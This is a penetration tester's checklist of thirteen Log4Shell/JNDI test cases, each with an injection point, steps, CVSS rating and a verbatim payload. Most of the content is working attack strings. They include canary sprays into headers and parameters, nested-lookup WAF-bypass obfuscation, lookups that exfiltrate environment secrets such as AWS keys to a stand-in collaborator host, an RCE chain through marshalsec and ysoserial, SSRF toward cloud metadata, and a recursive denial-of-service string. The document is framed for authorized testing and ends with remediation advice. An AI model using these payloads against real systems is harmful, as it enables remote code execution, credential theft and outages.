# JNDI / Log4Shell — Checklist

Expert per-attack **test-case matrix** for JNDI / Log4Shell — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*13 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## JNDI-001 — Stand up OOB + confirm Java stack + map logged inputs
**Test Category:** Recon &amp; OOB Setup · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Whole app, before any payload

**Test Steps:** 1. Bring up your OOB (interactsh / Burp Collaborator) with DNS + LDAP/RMI capture ready - this is the oracle.<br>2. Confirm the stack is Java: error pages, JSESSIONID, Spring whitelabel, .jsp/.do, Server header, fingerprint.<br>3. List candidate LOGGED inputs: headers, params, body, username, filename, path (404s get logged).

**Expected Result:** OOB is live and a list of Java-logged candidate inputs exists.

**Payload Example:**

```
interactsh-client ; JSESSIONID + Spring whitelabel confirm Java ; log candidates: UA, XFF, username
```

**Impact:** No OOB = no way to prove blind RCE; wrong stack = wasted effort.

**Tools:** interactsh-client, Burp Collaborator, httpx

**References:** CWE-917; OWASP: Log4Shell (CVE-2021-44228)

---

## JNDI-002 — Canary spray into every header (per-input token)
**Test Category:** Detect — Blind OOB · **Severity:** Critical · **CVSS:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** User-Agent, X-Forwarded-For, Referer, Authorization, custom X-* headers

**Test Steps:** 1. Fire ${jndi:ldap://TOKEN.$COLLAB/a} into EVERY header, each with a DISTINCT token so a callback names the exact input.<br>2. Watch the OOB for a DNS/LDAP hit from the TARGET egress IP carrying your token.<br>3. Confirm the source is the target (IP+timing), not your resolver / a scanner sandbox.

**Expected Result:** A target-sourced DNS/LDAP callback carries your per-header token.

**Payload Example:**

```
User-Agent: ${jndi:ldap://ua-TOKEN.$COLLAB/a} ; X-Forwarded-For: ${jndi:ldap://xff-TOKEN.$COLLAB/a}
```

**Impact:** A target-sourced callback = blind unauthenticated RCE = Critical (10.0).

**Tools:** poc/jndi_probe.py, interactsh, log4j-scan

**References:** CWE-917; NVD CVE-2021-44228 (Log4Shell)

---

## JNDI-003 — Canary spray into params / JSON / username / filename / path
**Test Category:** Detect — Blind OOB · **Severity:** Critical · **CVSS:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Every query/body param, JSON value AND key, login username, filename, request path

**Test Steps:** 1. Fire the canary into every param, JSON value and key, login username, filename, and the request path.<br>2. Distinct per-input token each time.<br>3. Include indirect sinks: values stored then logged by a back-office worker / admin panel.

**Expected Result:** A callback identifies which non-header input reached the logger.

**Payload Example:**

```
{"user":"${jndi:ldap://user-TOKEN.$COLLAB/a}"} ; /${jndi:ldap://path-TOKEN.$COLLAB/a}
```

**Impact:** Blind RCE via any logged input - Critical (10.0). Second-order sinks are easily missed.

**Tools:** poc/jndi_probe.py, interactsh

**References:** CWE-917; HackTricks: JNDI - Java Naming and Directory Interface &amp; Log4Shell

---

## JNDI-004 — DNS-protocol canary (egress-filter survival)
**Test Category:** Detect — Blind OOB · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Same inputs, where LDAP egress may be blocked

**Test Steps:** 1. Use ${jndi:dns://TOKEN.$COLLAB/a} - DNS survives most egress filtering and is stealthiest.<br>2. A DNS hit alone proves lookups resolve (&gt;= partial vuln).<br>3. Prefer dns:// where egress is tight.

**Expected Result:** A DNS callback confirms the lookup resolves even when LDAP is filtered.

**Payload Example:**

```
${jndi:dns://TOKEN.$COLLAB/a}
```

**Impact:** Confirms JNDI evaluation even behind tight egress - the least-intrusive conclusive proof.

**Tools:** interactsh (DNS)

**References:** CWE-917; NVD CVE-2021-44228 (Log4Shell)

---

## JNDI-005 — WAF bypass — nested-lookup obfuscation
**Test Category:** Evade — WAF/Filter · **Severity:** Critical · **CVSS:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Inputs where raw ${jndi:} is blocked

**Test Steps:** 1. Log4j resolves nested ${}: ${${lower:j}ndi:ldap://TOKEN.$COLLAB/a}.<br>2. ${::-X} yields literal X: ${${::-j}${::-n}${::-d}${::-i}:...}.<br>3. Rebuild both jndi AND ldap from sub-lookups; URL-encode; split across two headers the app concatenates; mix ldap/dns.

**Expected Result:** The obfuscated payload evaluates and calls back despite the WAF.

**Payload Example:**

```
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://TOKEN.$COLLAB/a} ; ${${::-j}${::-n}${::-d}${::-i}:...}
```

**Impact:** Restores Log4Shell against signature WAFs - proves the filter is not a fix. Critical.

**Tools:** poc/payload_gen.py, Burp

**References:** CWE-917; HackTricks: JNDI - Java Naming and Directory Interface &amp; Log4Shell

---

## JNDI-006 — Secret / env-var exfiltration (no RCE needed; works on 2.15)
**Test Category:** Impact — Data Theft · **Severity:** Critical · **CVSS:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Confirmed lookup resolution

**Test Steps:** 1. Embed an env/sys var as the DNS label: ${jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.$COLLAB/a}.<br>2. Also DB_PASSWORD, ${sys:user.name}, ${env:HOSTNAME}, KUBERNETES_SERVICE_HOST.<br>3. The resolved value arrives as a DNS label at your OOB (base32/hex if it has invalid chars; split long values). Confirm the label is NON-EMPTY.

**Expected Result:** The secret's value arrives as a DNS label at your OOB.

**Payload Example:**

```
${jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.$COLLAB/a} ; ${jndi:ldap://${env:DB_PASSWORD}.$COLLAB/a}
```

**Impact:** Cloud/DB credential exfiltration even where RCE is mitigated (Log4j 2.15) - Critical.

**Tools:** interactsh (DNS), poc/payload_gen.py

**References:** CWE-917; CWE-200; HackTricks: JNDI - Java Naming and Directory Interface &amp; Log4Shell

---

## JNDI-007 — Version / JVM fingerprint via lookups
**Test Category:** Impact — Fingerprint · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed lookup resolution

**Test Steps:** 1. ${jndi:dns://ver-${sys:java.version}.$COLLAB/a} -&gt; JDK version decides the RCE technique (pre/post Oct-2018 trustURLCodebase).<br>2. ${jndi:dns://os-${sys:os.name}.$COLLAB/a}.<br>3. A correct value returning confirms lookups resolve and selects technique A/B/C.

**Expected Result:** The JVM/OS version arrives as a DNS label, selecting the exploit technique.

**Payload Example:**

```
${jndi:dns://ver-${sys:java.version}.$COLLAB/a} ; ${jndi:dns://os-${sys:os.name}.$COLLAB/a}
```

**Impact:** Determines the JVM state and thus which RCE path is viable - drives escalation.

**Tools:** interactsh

**References:** CWE-917; HackTricks: JNDI - Java Naming and Directory Interface &amp; Log4Shell

---

## JNDI-008 — RCE delivery — technique A/B/C (authorized only)
**Test Category:** Impact — RCE · **Severity:** Critical · **CVSS:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Confirmed callback; AUTHORIZED engagement/lab

**Test Steps:** 1. A (remote codebase, old JVM trustURLCodebase=true): marshalsec LDAPRefServer + host Exploit.class -&gt; ${jndi:ldap://$ATTACKER:1389/Exploit}.<br>2. B (serialized gadget, bypasses trustURLCodebase): marshalsec + ysoserial CC5/6 as javaSerializedData.<br>3. C (BeanFactory/EL local bypass, modern JVM): JNDI-Injection-Exploit / rogue-jndi auto-select.<br>4. Prove ONE benign command (id/hostname), then STOP. Tear down servers.

**Expected Result:** A benign command executes on the target via the matched JNDI technique.

**Payload Example:**

```
${jndi:ldap://$ATTACKER:1389/Exploit} (A) ; marshalsec+ysoserial (B) ; rogue-jndi (C) -> id
```

**Impact:** Full unauthenticated RCE proven - Critical (10.0).

**Tools:** marshalsec, ysoserial, rogue-jndi, JNDI-Injection-Exploit

**References:** CWE-917; CWE-502; NVD CVE-2021-44228 (Log4Shell)

---

## JNDI-009 — SSRF angle via JNDI lookup
**Test Category:** Impact — SSRF · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** JNDI lookup that reaches internal hosts / metadata

**Test Steps:** 1. Point the lookup at internal/metadata: ${jndi:ldap://169.254.169.254/...} / internal host:port.<br>2. Where RCE is mitigated, the lookup still proves internal reachability.<br>3. Hand to the SSRF kit for metadata-&gt;creds.

**Expected Result:** The lookup reaches an internal host / cloud metadata endpoint.

**Payload Example:**

```
${jndi:ldap://169.254.169.254:80/a} ; ${jndi:ldap://internal-svc:8080/a}
```

**Impact:** SSRF -&gt; internal reach / cloud metadata even without RCE - Medium/High.

**Tools:** SSRFmap, interactsh

**References:** CWE-917; CWE-918; HackTricks: JNDI - Java Naming and Directory Interface &amp; Log4Shell

---

## JNDI-010 — DoS — recursive lookup (CVE-2021-45105)
**Test Category:** Impact — DoS · **Severity:** Medium · **CVSS:** 5.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H)

**Where to Test / Injection Point:** Log4j 2.x &lt; 2.17; AUTHORIZE first

**Test Steps:** 1. Self-referential recursion: ${${::-${::-$${::-:}}}} -&gt; StackOverflow.<br>2. Prove reproducibility WITH authorization only.<br>3. Never crash prod for real users.

**Expected Result:** A recursive lookup causes a StackOverflow / thread hang.

**Payload Example:**

```
${${::-${::-$${::-:}}}}
```

**Impact:** Availability impact (CVE-2021-45105) - Medium/High (scope required).

**Tools:** manual

**References:** CWE-917; CWE-674; Log4j CVE-2021-45105; NVD CVE-2021-44228 (Log4Shell)

---

## JNDI-011 — Map the CVE chain &amp; non-Log4j JNDI sinks; distinguish
**Test Category:** Product-Specific · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Log4j version + other JNDI-using products

**Test Steps:** 1. Map to the Log4j chain (44228 / 45046 / 45105 / 44832) or a non-Log4j sink.<br>2. Check H2 console, Logback JNDI config, Solr/Druid/Struts, Spring JDBCAppender.<br>3. Confirm it is JNDI injection, NOT LDAP-filter injection / plain deserialization / SpEL / Spring4Shell.

**Expected Result:** The exact CVE/sink is identified and mislabels are ruled out.

**Payload Example:**

```
Log4j 2.14 -> CVE-2021-44228 ; H2 console JNDI ; Logback config JNDI
```

**Impact:** Correct CVE attribution + ruling out look-alikes = an accurate, defensible report.

**Tools:** nuclei -tags log4j,jndi

**References:** CWE-917; Log4j CVE-2021-44228/45046/45105/44832; NVD CVE-2021-44228 (Log4Shell)

---

## JNDI-012 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: ${jndi:} merely reflected with NO callback; a scanner 'log4j detected'/version banner with no target callback; a DNS hit from YOUR resolver / a CDN / a proxy (not target egress); a callback from an AV/scanner sandbox detonating the payload; ${env:X} exfil where the arriving label is EMPTY; a DoS that only crashed your local test.<br>2. REQUIRE: a target-sourced OOB callback carrying your token.

**Expected Result:** Only target-sourced, token-carrying callbacks survive.

**Payload Example:**

```
reflected ${jndi:} = not a finding ; scanner banner = reproduce with your OOB ; empty ${env} label = var not set
```

**Impact:** Protects credibility; Log4Shell is dense with reflection-only / scanner-banner false positives.

**Tools:** manual

**References:** CWE-917; PortSwigger Research: Log4Shell / JNDI

---

## JNDI-013 — Client-facing impact &amp; SAFE-PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with impact: unauthenticated RCE (10.0) / credential exfil.<br>2. Provide the payload, the named input, and the target-sourced OOB callback carrying your token (+ optionally one benign command or one ${env} leak).<br>3. Set CVSS (10.0 unauth RCE) + CWE-917 (+ CWE-502 for the gadget path). Remediation: upgrade to Log4j 2.17.1+, remove JndiLookup.class, set log4j2.formatMsgNoLookups/trustURLCodebase=false, egress-filter LDAP/RMI/DNS.<br>4. Own OOB, per-input tokens, one benign proof then STOP, no shells/persistence, tear down exploit servers; de-dupe to one sink.

**Expected Result:** A reproducible, correctly-rated, safe PoC with clear remediation.

**Payload Example:**

```
PoC: payload + named input + target-sourced callback with token + CVSS 10.0 + CWE-917 + remediation.
```

**Impact:** Converts the callback into a defensible Critical (10.0) report at the right severity.

**Tools:** CVSS calculator, JNDI_REPORT_TEMPLATE.md

**References:** CWE-917; CWE-502; FIRST CVSS v3.1; NVD CVE-2021-44228 (Log4Shell)  |  TOP REFERENCES: LunaSec/Veracode Log4Shell writeups; Alvaro Munoz &amp; pwntester JNDI research (BlackHat); PortSwigger Research; NVD CVE-2021-44228

---
